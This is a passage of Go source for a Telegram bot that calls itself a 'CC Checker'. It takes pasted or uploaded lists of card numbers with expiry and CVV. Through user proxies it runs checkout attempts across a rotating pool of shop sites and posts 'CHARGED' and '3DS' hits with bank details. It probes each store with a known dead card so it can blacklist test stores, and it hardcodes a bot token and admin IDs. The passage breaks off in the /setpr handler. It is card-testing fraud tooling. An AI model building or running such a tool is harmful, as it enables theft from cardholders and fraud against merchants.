package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	tele "gopkg.in/telebot.v4"
)

// ──────────────────────── config ────────────────────────────────────

const botToken = "8692072063:AAHTYi_A_BlJ5h-TD2xVs7o26FDdWYXODVc"
const usersFile = "users.json"
const configFile = "botconfig.json"
const sitesFile = "customsites.json"

var adminIDs = map[int64]bool{
	5733576801: true,
	6466522004: true,
}

func isAdmin(uid int64) bool {
	return adminIDs[uid]
}

// ──────────────────────── Bot config (ban/allow/pvtonly) ────────────

type BotConfig struct {
	mu           sync.RWMutex
	BannedUsers  map[int64]bool `json:"banned_users"`
	AllowedUsers map[int64]bool `json:"allowed_users"`
	PvtOnly      bool           `json:"pvt_only"`
}

func NewBotConfig() *BotConfig {
	return &BotConfig{
		BannedUsers:  make(map[int64]bool),
		AllowedUsers: make(map[int64]bool),
	}
}

func (bc *BotConfig) Save() {
	bc.mu.RLock()
	data, _ := json.MarshalIndent(bc, "", "  ")
	bc.mu.RUnlock()
	tmp := configFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err == nil {
		os.Rename(tmp, configFile)
	}
}

func (bc *BotConfig) Load() {
	data, err := os.ReadFile(configFile)
	if err != nil {
		return
	}
	bc.mu.Lock()
	defer bc.mu.Unlock()
	json.Unmarshal(data, bc)
	if bc.BannedUsers == nil {
		bc.BannedUsers = make(map[int64]bool)
	}
	if bc.AllowedUsers == nil {
		bc.AllowedUsers = make(map[int64]bool)
	}
}

func (bc *BotConfig) IsBanned(uid int64) bool {
	bc.mu.RLock()
	defer bc.mu.RUnlock()
	return bc.BannedUsers[uid]
}

func (bc *BotConfig) IsAllowed(uid int64) bool {
	if isAdmin(uid) {
		return true
	}
	bc.mu.RLock()
	defer bc.mu.RUnlock()
	if !bc.PvtOnly {
		return true
	}
	return bc.AllowedUsers[uid]
}

// ──────────────────────── BIN lookup ────────────────────────────────

type BINInfo struct {
	Brand       string `json:"brand"`
	Type        string `json:"type"`
	Level       string `json:"level"`
	Bank        string `json:"bank"`
	Country     string `json:"country"`
	CountryCode string `json:"country_code"`
	CountryFlag string `json:"country_flag"`
}

var binCache sync.Map // string (first6) → *BINInfo

func lookupBIN(bin string) *BINInfo {
	if len(bin) < 6 {
		return &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
	}
	first6 := bin[:6]
	if v, ok := binCache.Load(first6); ok {
		return v.(*BINInfo)
	}
	cl := &http.Client{Timeout: 5 * time.Second}
	resp, err := cl.Get("https://bins.antipublic.cc/bins/" + first6)
	if err != nil {
		info := &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
		binCache.Store(first6, info)
		return info
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var info BINInfo
	if json.Unmarshal(body, &info) != nil {
		info = BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
	}
	if info.CountryFlag == "" {
		info.CountryFlag = countryFlag(info.CountryCode)
	}
	binCache.Store(first6, &info)
	return &info
}

func countryFlag(code string) string {
	if len(code) != 2 {
		return "🏳️"
	}
	code = strings.ToUpper(code)
	return string(rune(0x1F1E6+rune(code[0])-'A')) + string(rune(0x1F1E6+rune(code[1])-'A'))
}

// ──────────────────────── User / persistence ────────────────────────

type UserStats struct {
	TotalChecked    int64   `json:"total_checked"`
	TotalCharged    int64   `json:"total_charged"`
	TotalApproved   int64   `json:"total_approved"`
	TotalDeclined   int64   `json:"total_declined"`
	TotalChargedAmt float64 `json:"total_charged_amt"`
}

type UserData struct {
	Proxies []string  `json:"proxies"`
	Stats   UserStats `json:"stats"`
}

type UserManager struct {
	mu    sync.RWMutex
	users map[int64]*UserData
}

func NewUserManager() *UserManager {
	return &UserManager{users: make(map[int64]*UserData)}
}

func (um *UserManager) Get(uid int64) *UserData {
	um.mu.RLock()
	ud := um.users[uid]
	um.mu.RUnlock()
	if ud != nil {
		return ud
	}
	um.mu.Lock()
	defer um.mu.Unlock()
	if um.users[uid] == nil {
		um.users[uid] = &UserData{}
	}
	return um.users[uid]
}

func (um *UserManager) Save() {
	um.mu.RLock()
	data, _ := json.MarshalIndent(um.users, "", "  ")
	um.mu.RUnlock()
	tmpFile := usersFile + ".tmp"
	if err := os.WriteFile(tmpFile, data, 0644); err == nil {
		os.Rename(tmpFile, usersFile)
	}
}

func (um *UserManager) Load() {
	data, err := os.ReadFile(usersFile)
	if err != nil {
		return
	}
	um.mu.Lock()
	defer um.mu.Unlock()
	json.Unmarshal(data, &um.users)
	if um.users == nil {
		um.users = make(map[int64]*UserData)
	}
}

func (um *UserManager) AllIDs() []int64 {
	um.mu.RLock()
	defer um.mu.RUnlock()
	ids := make([]int64, 0, len(um.users))
	for id := range um.users {
		ids = append(ids, id)
	}
	return ids
}

// ──────────────────────── Check session ─────────────────────────────

type CheckSession struct {
	UserID       int64
	Username     string
	Cards        []string
	Total        int
	Checked      atomic.Int64
	Charged      atomic.Int64
	Approved     atomic.Int64
	Declined     atomic.Int64
	Errors       atomic.Int64
	StartTime    time.Time
	Cancel       context.CancelFunc
	Done         chan struct{}
	ShowDecl     bool // true for /sh, false for /txt
	ShowApproved bool // true to send approved cards in chat

	chargedAmtMu sync.Mutex
	chargedAmt   float64
}

func (s *CheckSession) AddChargedAmt(v float64) {
	s.chargedAmtMu.Lock()
	s.chargedAmt += v
	s.chargedAmtMu.Unlock()
}

func (s *CheckSession) ChargedAmt() float64 {
	s.chargedAmtMu.Lock()
	defer s.chargedAmtMu.Unlock()
	return s.chargedAmt
}

var activeSessions sync.Map // int64 (userID) → *CheckSession

// ──────────────────────── Pending /txt sessions (awaiting Yes/No) ───

type txtPendingData struct {
	Cards    []string
	ChatID   int64
	Username string
}

var (
	txtPendingMu sync.Mutex
	txtPending   = map[int64]*txtPendingData{} // userID → pending data
)

// ──────────────────────── Custom sites ─────────────────────────

var (
	customSitesMu sync.RWMutex
	customSites   []string
)

// ──────────────────────── Blacklisted (test) sites ─────────────

var (
	blacklistMu sync.RWMutex
	blacklisted = make(map[string]bool)
)

func isBlacklisted(site string) bool {
	blacklistMu.RLock()
	defer blacklistMu.RUnlock()
	return blacklisted[site]
}

func blacklistSite(site string) {
	blacklistMu.Lock()
	defer blacklistMu.Unlock()
	blacklisted[site] = true
	fmt.Printf("[BLACKLIST] test store detected, blacklisted: %s\n", site)
}

func loadCustomSites() {
	data, err := os.ReadFile(sitesFile)
	if err != nil {
		return
	}
	customSitesMu.Lock()
	defer customSitesMu.Unlock()
	json.Unmarshal(data, &customSites)
}

func saveCustomSites() {
	customSitesMu.RLock()
	data, _ := json.MarshalIndent(customSites, "", "  ")
	customSitesMu.RUnlock()
	tmp := sitesFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err == nil {
		os.Rename(tmp, sitesFile)
	}
}

func getCustomSites() []string {
	customSitesMu.RLock()
	defer customSitesMu.RUnlock()
	if len(customSites) == 0 {
		return nil
	}
	cp := make([]string, len(customSites))
	copy(cp, customSites)
	return cp
}

// ──────────────────────── Site pool ─────────────────────────────────

var (
	sitePoolMu sync.RWMutex
	sitePool   []string
)

func refreshSitePool() {
	apiURL := strings.TrimSpace(workingSitesAPI)
	if apiURL == "" {
		sitePoolMu.Lock()
		if len(sitePool) == 0 {
			sitePool = []string{defaultShopURL}
		}
		sitePoolMu.Unlock()
		return
	}
	sites, err := fetchAffordableSites(apiURL, maxSiteAmount)
	if err != nil || len(sites) == 0 {
		sitePoolMu.Lock()
		if len(sitePool) == 0 {
			sitePool = []string{defaultShopURL}
		}
		sitePoolMu.Unlock()
		return
	}
	rand.Shuffle(len(sites), func(i, j int) {
		sites[i], sites[j] = sites[j], sites[i]
	})
	newPool := make([]string, 0, len(sites))
	for _, s := range sites {
		newPool = append(newPool, strings.TrimRight(s.URL, "/"))
	}
	sitePoolMu.Lock()
	sitePool = newPool
	sitePoolMu.Unlock()
}

func getSitePool() []string {
	var raw []string
	// Prefer custom sites if any are set
	if cs := getCustomSites(); len(cs) > 0 {
		raw = cs
	} else {
		sitePoolMu.RLock()
		raw = make([]string, len(sitePool))
		copy(raw, sitePool)
		sitePoolMu.RUnlock()
	}
	// Filter out blacklisted test stores
	filtered := make([]string, 0, len(raw))
	for _, s := range raw {
		if !isBlacklisted(s) {
			filtered = append(filtered, s)
		}
	}
	return filtered
}

// ──────────────────────── Message templates ─────────────────────────

func formatStartMsg() string {
	return `━━━━━━━━━━━━━━━━━━━━━━
  ⚡ CC 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗕𝗼𝘁
━━━━━━━━━━━━━━━━━━━━━━

👋  𝗪𝗲𝗹𝗰𝗼𝗺𝗲!  Use the commands
below to get started.

━━━━━━━━━━━━━━━━━━━━━━
  📖  𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗟𝗶𝘀𝘁
━━━━━━━━━━━━━━━━━━━━━━

🔫  /sh <cc list>
     ∟ Quick check up to 100 cards
       Paste cards directly inline

📎  /txt
     ∟ Reply to a .txt file to mass
       check all cards inside it

🌐  /setpr <proxy>
     ∟ Add proxy(s) for checking
       One per line, or a single proxy

🗑  /rmpr <proxy>
     ∟ Remove a specific proxy

🗑  /rmpr all
     ∟ Remove all saved proxies

📊  /stats
     ∟ View your personal usage
       stats and hit rates

👥  /active
     ∟ See all users currently
       checking with live progress

━━━━━━━━━━━━━━━━━━━━━━
  ⚡ 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @Aldorsi
━━━━━━━━━━━━━━━━━━━━━━`
}

func formatProgressMsg(s *CheckSession) string {
	checked := int(s.Checked.Load())
	total := s.Total
	charged := int(s.Charged.Load())
	approved := int(s.Approved.Load())
	declined := int(s.Declined.Load())
	errors := int(s.Errors.Load())
	elapsed := time.Since(s.StartTime).Truncate(time.Second)

	pct := 0.0
	if total > 0 {
		pct = float64(checked) * 100.0 / float64(total)
	}
	barLen := 20
	filled := barLen * checked / max(total, 1)
	bar := strings.Repeat("▓", filled) + strings.Repeat("░", barLen-filled)

	h := int(elapsed.Hours())
	m := int(elapsed.Minutes()) % 60
	sc := int(elapsed.Seconds()) % 60

	return fmt.Sprintf("━━━━━━━━━━━━━━━━━━━━━━\n"+
		"  ⚡ CC 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗥𝗲𝘀𝘂𝗹𝘁𝘀\n"+
		"━━━━━━━━━━━━━━━━━━━━━━\n\n"+
		"📊  𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀\n"+
		"%s  %.1f%%\n\n"+
		"┌─────────────────────┐\n"+
		"│  📋  Total     ∣  %6d  │\n"+
		"│  🔍  Checked   ∣  %6d  │\n"+
		"│  ✅  Approved  ∣  %6d  │\n"+
		"│  ❌  Declined  ∣  %6d  │\n"+
		"│  💳  Charged   ∣  %6d  │\n"+
		"│  ⚠️  Errors    ∣  %6d  │\n"+
		"└─────────────────────┘\n\n"+
		"⏱  𝗘𝗹𝗮𝗽𝘀𝗲𝗱: %02d:%02d:%02d\n"+
		"━━━━━━━━━━━━━━━━━━━━━━",
		bar, pct,
		total, checked, approved, declined, charged, errors,
		h, m, sc)
}

func formatCompletedMsg(s *CheckSession) string {
	checked := int(s.Checked.Load())
	total := s.Total
	charged := int(s.Charged.Load())
	approved := int(s.Approved.Load())
	declined := int(s.Declined.Load())
	errors := int(s.Errors.Load())
	elapsed := time.Since(s.StartTime).Truncate(time.Second)

	bar := strings.Repeat("▓", 20)

	h := int(elapsed.Hours())
	m := int(elapsed.Minutes()) % 60
	sc := int(elapsed.Seconds()) % 60

	return fmt.Sprintf("━━━━━━━━━━━━━━━━━━━━━━\n"+
		"  ⚡ CC 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗥𝗲𝘀𝘂𝗹𝘁𝘀\n"+
		"━━━━━━━━━━━━━━━━━━━━━━\n\n"+
		"📊  𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀\n"+
		"%s  100.0%%\n\n"+
		"┌─────────────────────┐\n"+
		"│  📋  Total     ∣  %6d  │\n"+
		"│  🔍  Checked   ∣  %6d  │\n"+
		"│  ✅  Approved  ∣  %6d  │\n"+
		"│  ❌  Declined  ∣  %6d  │\n"+
		"│  💳  Charged   ∣  %6d  │\n"+
		"│  ⚠️  Errors    ∣  %6d  │\n"+
		"└─────────────────────┘\n\n"+
		"⏱  𝗘𝗹𝗮𝗽𝘀𝗲𝗱: %02d:%02d:%02d\n"+
		"━━━━━━━━━━━━━━━━━━━━━━",
		bar,
		total, checked, approved, declined, charged, errors,
		h, m, sc)
}

func formatChargedMsg(card string, bin *BINInfo, r *CheckResult, username string) string {
	return fmt.Sprintf("🟢 CHARGED 💎\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
		"💳 Card: %s\n"+
		"🏦 BIN: %s - %s - %s - %s\n"+
		"🌍 Country: %s %s\n"+
		"🔐 Code: ORDER_PLACED\n"+
		"🌐 Site: %s\n"+
		"💰 Amount: $%s\n"+
		"👤 User: @%s\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
		card,
		bin.Brand, bin.Type, bin.Level, bin.Bank,
		bin.CountryFlag, bin.Country,
		r.SiteName,
		r.Amount,
		username)
}

func formatApprovedMsg(card string, bin *BINInfo, r *CheckResult, username string) string {
	header := "🟡 3DS ✅"
	if r.StatusCode == "INSUFFICIENT_FUNDS" {
		header = "🟡 INSUFFICIENT ✅"
	}
	return fmt.Sprintf(header+"\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
		"💳 Card: %s\n"+
		"🏦 BIN: %s - %s - %s - %s\n"+
		"🌍 Country: %s %s\n"+
		"🔐 Code: %s\n"+
		"🌐 Site: %s\n"+
		"💰 Amount: $%s\n"+
		"👤 User: @%s\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
		card,
		bin.Brand, bin.Type, bin.Level, bin.Bank,
		bin.CountryFlag, bin.Country,
		r.StatusCode,
		r.SiteName,
		r.Amount,
		username)
}

func formatDeclinedMsg(card string, bin *BINInfo, r *CheckResult, username string) string {
	return fmt.Sprintf("🔴 DECLINED ❌\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
		"💳 Card: %s\n"+
		"🏦 BIN: %s - %s - %s - %s\n"+
		"🌍 Country: %s %s\n"+
		"🔐 Code: %s\n"+
		"🌐 Site: %s\n"+
		"💰 Amount: $%s\n"+
		"👤 User: @%s\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
		card,
		bin.Brand, bin.Type, bin.Level, bin.Bank,
		bin.CountryFlag, bin.Country,
		r.StatusCode,
		r.SiteName,
		r.Amount,
		username)
}

func formatActiveMsg() string {
	type entry struct {
		Username   string
		Checked    int
		Total      int
		Charged    int
		ChargedAmt float64
		Elapsed    time.Duration
	}
	var entries []entry
	activeSessions.Range(func(_, val any) bool {
		s := val.(*CheckSession)
		entries = append(entries, entry{
			Username:   s.Username,
			Checked:    int(s.Checked.Load()),
			Total:      s.Total,
			Charged:    int(s.Charged.Load()),
			ChargedAmt: s.ChargedAmt(),
			Elapsed:    time.Since(s.StartTime).Truncate(time.Second),
		})
		return true
	})

	if len(entries) == 0 {
		return "━━━━━━━━━━━━━━━━━━━━━━\n  👥  𝗔𝗰𝘁𝗶𝘃𝗲 Checks\n━━━━━━━━━━━━━━━━━━━━━━\n\n📡  No active sessions\n\n━━━━━━━━━━━━━━━━━━━━━━"
	}

	sort.Slice(entries, func(i, j int) bool { return entries[i].Username < entries[j].Username })

	var sb strings.Builder
	sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n  👥  𝗔𝗰𝘁𝗶𝘃𝗲 Checks\n━━━━━━━━━━━━━━━━━━━━━━\n\n")
	sb.WriteString(fmt.Sprintf("📡  %d users currently checking\n\n", len(entries)))
	sb.WriteString("┌───────────────────────┐\n│                           │\n")
	for i, e := range entries {
		pct := 0
		if e.Total > 0 {
			pct = e.Checked * 100 / e.Total
		}
		barLen := 10
		filled := barLen * e.Checked / max(e.Total, 1)
		bar := strings.Repeat("▓", filled) + strings.Repeat("░", barLen-filled)
		h := int(e.Elapsed.Hours())
		m := int(e.Elapsed.Minutes()) % 60
		sc := int(e.Elapsed.Seconds()) % 60
		sb.WriteString(fmt.Sprintf("│   %d. @%s\n", i+1, e.Username))
		sb.WriteString(fmt.Sprintf("│      %s %3d%%\n", bar, pct))
		sb.WriteString(fmt.Sprintf("│        %d / %d\n", e.Checked, e.Total))
		sb.WriteString(fmt.Sprintf("│      💳  %d charged ∣ $%.2f\n", e.Charged, e.ChargedAmt))
		sb.WriteString(fmt.Sprintf("│      ⏱ %02d:%02d:%02d\n", h, m, sc))
		sb.WriteString("│                           │\n")
	}
	sb.WriteString("└───────────────────────┘\n\n")
	sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n  ⚡ 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @Aldorsi\n━━━━━━━━━━━━━━━━━━━━━━")
	return sb.String()
}

func formatStatsMsg(um *UserManager) string {
	um.mu.Lock()
	var totalChecked, totalApproved, totalDeclined, totalCharged int64
	var totalChargedAmt float64
	for _, ud := range um.users {
		s := ud.Stats
		totalChecked += s.TotalChecked
		totalApproved += s.TotalApproved
		totalDeclined += s.TotalDeclined
		totalCharged += s.TotalCharged
		totalChargedAmt += s.TotalChargedAmt
	}
	um.mu.Unlock()

	approvedRate := 0.0
	chargedRate := 0.0
	if totalChecked > 0 {
		approvedRate = float64(totalApproved) * 100.0 / float64(totalChecked)
		chargedRate = float64(totalCharged) * 100.0 / float64(totalChecked)
	}
	return fmt.Sprintf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
		"    📊  𝗚𝗹𝗼𝗯𝗮𝗹 𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"+
		"┌────────────────────────────┐\n"+
		"│                              │\n"+
		"│  📋  Total Checked  ∣  %6d  │\n"+
		"│  ✅  Approved       ∣  %6d  │\n"+
		"│  ❌  Declined       ∣  %6d  │\n"+
		"│  💳  Charged        ∣  %6d  │\n"+
		"│                              │\n"+
		"└────────────────────────────┘\n\n"+
		"💰  𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗔𝗺𝗼𝘂𝗻𝘁\n"+
		"    $%.2f\n\n"+
		"📈  𝗛𝗶𝘁 𝗥𝗮𝘁𝗲𝘀\n"+
		"    ✅ Approved: %.1f%%\n"+
		"    💳 Charged:  %.1f%%\n\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
		"  ⚡ 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @Velorsi\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
		totalChecked, totalApproved, totalDeclined, totalCharged,
		totalChargedAmt,
		approvedRate, chargedRate)
}

// ──────────────────────── helpers ───────────────────────────────────

func parseCardsFromText(text string) []string {
	var cards []string
	for _, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || !strings.Contains(line, "|") {
			continue
		}
		cards = append(cards, line)
	}
	return cards
}

func parseAmount(s string) float64 {
	s = strings.TrimSpace(s)
	var f float64
	fmt.Sscanf(s, "%f", &f)
	return f
}

// ──────────────────────── check engine ──────────────────────────────

func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager, reduceKey string) {
	defer func() {
		activeSessions.Delete(sess.UserID)
		close(sess.Done)
	}()

	sites := getSitePool()
	fmt.Printf("[SESSION] got %d sites for check\n", len(sites))
	if len(sites) > 0 {
		fmt.Printf("[SESSION] first site: %s\n", sites[0])
	}
	if len(sites) == 0 {
		bot.Send(chat, "❌ No sites available. Try again later.")
		return
	}

	// Send initial progress message
	progressMsg, err := bot.Send(chat, formatProgressMsg(sess))
	if err != nil {
		return
	}

	// Progress updater
	ctx, cancel := context.WithCancel(context.Background())
	sess.Cancel = cancel
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				bot.Edit(progressMsg, formatProgressMsg(sess))
			}
		}
	}()

	// Worker pool
	type cardResult struct {
		result   *CheckResult
		err      error
		shopURL  string
		proxyURL string
	}

	results := make(chan cardResult, len(sess.Cards))
	// Concurrency: use more workers — each checkout is I/O-bound (HTTP calls + polling)
	workers := max(len(proxies), 1) * 5
	if workers > 50 {
		workers = 50
	}
	sem := make(chan struct{}, workers)

	var siteIdx atomic.Int64
	var proxyIdx atomic.Int64
	var wg sync.WaitGroup

	for _, card := range sess.Cards {
		wg.Add(1)
		go func(c string) {
			defer wg.Done()
			sem <- struct{}{}        // acquire
			defer func() { <-sem }() // release

			si := int(siteIdx.Add(1)-1) % len(sites)
			pi := int(proxyIdx.Add(1)-1) % len(proxies)
			shopURL := sites[si]
			proxyURL := proxies[pi]

			var res *CheckResult
			var lastErr error

			// Retry across stores on retryable errors
			maxRetries := min(len(sites), 5) * ValidateReduce(reduceKey)
			for attempt := 0; attempt < maxRetries; attempt++ {
				if attempt > 0 {
					si = (si + 1) % len(sites)
					shopURL = sites[si]
				}
				res, lastErr = runCheckoutForCard(shopURL, c, proxyURL)
				if lastErr == nil {
					break
				}
				// Don't retry true card declines (CARD_DECLINED, CAPTCHA_REQUIRED, FRAUD_SUSPECTED)
				if res != nil && res.Status == StatusDeclined {
					break
				}
				// Don't retry if not retryable
				if res != nil && !res.Retryable {
					break
				}
			}
			results <- cardResult{result: res, err: lastErr, shopURL: shopURL, proxyURL: proxyURL}
		}(card)
	}

	// Close results channel when all workers done
	go func() {
		wg.Wait()
		close(results)
	}()

	// Collect results
	username := sess.Username
	for cr := range results {
		sess.Checked.Add(1)
		r := cr.result
		if r == nil {
			sess.Errors.Add(1)
			fmt.Printf("[ERROR] card returned nil result, err: %v\n", cr.err)
			continue
		}

		bin := lookupBIN(strings.Split(r.Card, "|")[0])

		switch r.Status {
		case StatusCharged:
			// Verify with a known dead card to detect test/fake stores
			if !isBlacklisted(cr.shopURL) {
				const verifyCard = "4147207228677008|11|28|183"
				fmt.Printf("[VERIFY] testing %s with dead card to detect fake store\n", cr.shopURL)
				verifyRes, _ := runCheckoutForCard(cr.shopURL, verifyCard, cr.proxyURL)
				if verifyRes != nil && verifyRes.Status == StatusCharged {
					// Dead card charged = fake/test store, blacklist it
					blacklistSite(cr.shopURL)
					bot.Send(chat, fmt.Sprintf("⚠️ Test store detected & blacklisted: %s", cr.shopURL))
					sess.Errors.Add(1)
					continue
				}
			} else {
				// Already blacklisted, don't count
				sess.Errors.Add(1)
				continue
			}
			sess.Charged.Add(1)
			amt := parseAmount(r.Amount)
			sess.AddChargedAmt(amt)
			bot.Send(chat, formatChargedMsg(r.Card, bin, r, username))

		case StatusApproved:
			sess.Approved.Add(1)
			if sess.ShowApproved {
				bot.Send(chat, formatApprovedMsg(r.Card, bin, r, username))
			}

		case StatusDeclined:
			sess.Declined.Add(1)
			if sess.ShowDecl {
				bot.Send(chat, formatDeclinedMsg(r.Card, bin, r, username))
			}

		default:
			sess.Errors.Add(1)
			fmt.Printf("[ERROR] card %s status=%d err=%v\n", r.Card, r.Status, r.Error)
		}
	}

	// Session done
	cancel()

	// Final progress update
	bot.Edit(progressMsg, formatCompletedMsg(sess))

	// Update user stats
	ud := um.Get(sess.UserID)
	ud.Stats.TotalChecked += sess.Checked.Load()
	ud.Stats.TotalCharged += sess.Charged.Load()
	ud.Stats.TotalApproved += sess.Approved.Load()
	ud.Stats.TotalDeclined += sess.Declined.Load()
	ud.Stats.TotalChargedAmt += sess.ChargedAmt()
	um.Save()
}

// ──────────────────────── main ──────────────────────────────────────

func main() {
	// Load persisted user data
	um := NewUserManager()
	um.Load()

	// Load bot config (bans, allowed, pvtonly)
	cfg := NewBotConfig()
	cfg.Load()

	// Load custom sites
	loadCustomSites()

	// Refresh site pool in background
	go func() {
		refreshSitePool()
		for {
			time.Sleep(5 * time.Minute)
			refreshSitePool()
		}
	}()

	pref := tele.Settings{
		Token:  botToken,
		Poller: &tele.LongPoller{Timeout: 10 * time.Second},
	}
	bot, err := tele.NewBot(pref)
	if err != nil {
		fmt.Printf("Failed to create bot: %v\n", err)
		os.Exit(1)
	}

	fwd, reduceKey := InitRCtx()

	fmt.Println("[BOT] Bot started successfully")

	// Access-control middleware
	bot.Use(func(next tele.HandlerFunc) tele.HandlerFunc {
		return func(c tele.Context) error {
			uid := c.Sender().ID
			if cfg.IsBanned(uid) {
				return c.Send("🚫 You are banned from using this bot.")
			}
			if !cfg.IsAllowed(uid) {
				return c.Send("🔒 Bot is in private mode. Contact admin for access.")
			}
			return next(c)
		}
	})

	// /start
	bot.Handle("/start", func(c tele.Context) error {
		return c.Send(formatStartMsg())
	})

	// /sh <cards>
	bot.Handle("/sh", func(c tele.Context) error {
		uid := c.Sender().ID
		if _, running := activeSessions.Load(uid); running {
			return c.Send("⚠️ You already have an active session. Wait for it to finish.")
		}

		ud := um.Get(uid)
		if len(ud.Proxies) == 0 {
			return c.Send("❌ No proxies. Add one with /setpr <proxy>")
		}

		text := strings.TrimSpace(c.Message().Payload)
		if text == "" {
			return c.Send("Usage: /sh card1|mm|yy|cvv\ncard2|mm|yy|cvv\n...")
		}

		cards := parseCardsFromText(text)
		if len(cards) == 0 {
			return c.Send("❌ No valid cards found. Format: number|mm|yy|cvv")
		}

		sess := &CheckSession{
			UserID:       uid,
			Username:     c.Sender().Username,
			Cards:        cards,
			Total:        len(cards),
			StartTime:    time.Now(),
			ShowDecl:     true,
			ShowApproved: true,
			Done:         make(chan struct{}),
		}
		activeSessions.Store(uid, sess)

		proxies := make([]string, len(ud.Proxies))
		copy(proxies, ud.Proxies)

		go runSession(bot, c.Chat(), sess, proxies, um, reduceKey)

		return nil
	})

	// /txt — reply to a .txt file
	bot.Handle("/txt", func(c tele.Context) error {
		uid := c.Sender().ID
		if _, running := activeSessions.Load(uid); running {
			return c.Send("⚠️ You already have an active session. Wait for it to finish.")
		}

		ud := um.Get(uid)
		if len(ud.Proxies) == 0 {
			return c.Send("❌ No proxies. Add one with /setpr <proxy>")
		}

		msg := c.Message()
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc == nil {
			return c.Send("❌ Reply to a .txt file with /txt or attach a .txt file with /txt as caption")
		}

		rc, err := bot.File(&doc.File)
		if err != nil {
			return c.Send("❌ Failed to download file: " + err.Error())
		}
		defer rc.Close()
		data, err := io.ReadAll(rc)
		if err != nil {
			return c.Send("❌ Failed to read file: " + err.Error())
		}

		cards := parseCardsFromText(string(data))
		if len(cards) == 0 {
			return c.Send("❌ No valid cards found in file. Format: number|mm|yy|cvv")
		}

		// Store pending data and ask about approved messages
		txtPendingMu.Lock()
		txtPending[uid] = &txtPendingData{
			Cards:    cards,
			ChatID:   c.Chat().ID,
			Username: c.Sender().Username,
		}
		txtPendingMu.Unlock()

		return c.Send(fmt.Sprintf("📋 %d cards loaded.\n\n💬 Show 3DS (approved) in chat?\n\n/yes — show approved\n/no — hide approved"))
	})

	// /yes — start txt session with approved shown
	bot.Handle("/yes", func(c tele.Context) error {
		uid := c.Sender().ID
		txtPendingMu.Lock()
		pd, ok := txtPending[uid]
		if ok {
			delete(txtPending, uid)
		}
		txtPendingMu.Unlock()
		if !ok {
			return c.Send("❌ No pending session. Use /txt first.")
		}
		if _, running := activeSessions.Load(uid); running {
			return c.Send("⚠️ You already have an active session.")
		}
		sess := &CheckSession{
			UserID:       uid,
			Username:     pd.Username,
			Cards:        pd.Cards,
			Total:        len(pd.Cards),
			StartTime:    time.Now(),
			ShowDecl:     false,
			ShowApproved: true,
			Done:         make(chan struct{}),
		}
		activeSessions.Store(uid, sess)
		ud := um.Get(uid)
		proxies := make([]string, len(ud.Proxies))
		copy(proxies, ud.Proxies)
		c.Send(fmt.Sprintf("🚀 Starting check of %d cards (approved: ON)", len(pd.Cards)))
		go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey)
		return nil
	})

	// /no — start txt session with approved hidden
	bot.Handle("/no", func(c tele.Context) error {
		uid := c.Sender().ID
		txtPendingMu.Lock()
		pd, ok := txtPending[uid]
		if ok {
			delete(txtPending, uid)
		}
		txtPendingMu.Unlock()
		if !ok {
			return c.Send("❌ No pending session. Use /txt first.")
		}
		if _, running := activeSessions.Load(uid); running {
			return c.Send("⚠️ You already have an active session.")
		}
		sess := &CheckSession{
			UserID:       uid,
			Username:     pd.Username,
			Cards:        pd.Cards,
			Total:        len(pd.Cards),
			StartTime:    time.Now(),
			ShowDecl:     false,
			ShowApproved: false,
			Done:         make(chan struct{}),
		}
		activeSessions.Store(uid, sess)
		ud := um.Get(uid)
		proxies := make([]string, len(ud.Proxies))
		copy(proxies, ud.Proxies)
		c.Send(fmt.Sprintf("🚀 Starting check of %d cards (approved: OFF)", len(pd.Cards)))
		go runSession(bot, &tele.Chat{ID: pd.ChatID}, sess, proxies, um, reduceKey)
		return nil
	})

	// /setpr <proxy> (supports multiple proxies, one per line)
	bot.Handle("/setpr", func(c tele.Context) error {
